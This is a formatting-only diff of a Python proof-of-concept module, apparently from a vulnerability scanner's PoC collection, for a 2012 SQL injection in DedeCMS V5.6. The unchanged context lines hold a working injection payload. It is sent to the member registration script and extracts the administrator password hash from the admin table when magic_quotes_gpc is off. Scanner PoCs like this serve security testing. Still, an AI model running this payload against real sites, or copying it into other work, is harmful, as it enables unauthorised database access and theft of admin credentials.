@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'DedeCMS_0022' # 平台漏洞编号，留空
+    vuln_id = 'DedeCMS_0022'  # 平台漏洞编号，留空
     name = 'DedeCMS V5.6 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2012-11-30'  # 漏洞公布时间
     desc = '''
         需要magic_quotes_gpc=Off
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
     product_version = 'DedeCMS 20121122'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'e0e05f92-7545-49bf-adab-e8a3fecc311c'
     author = '47bwy'  # POC编写者
@@ -34,7 +36,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/de/member/reg_new.php'
             data = "dopost=regbase&step=1&mtype=%E4%B8%AA%E4%BA%BA&mtype=%E4%B8%AA%E4%BA%BA&userid=c4rp3nt3r&uname=c4rp3nt3r&userpwd=ssssss&userpwdok=ssssss&email=sss%40ss.ss&safequestion=0&safeanswer=&sex=boy',100,100,'sss@xx.xx',1000,0,'www' and @`'`,(select concat(md5(c),0x3a,pwd) from `#@__admin` limit 1),0,'',1316751900,'',1316751900,'');%00&vdcode=glos&agree="
             url = self.target + payload
@@ -49,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
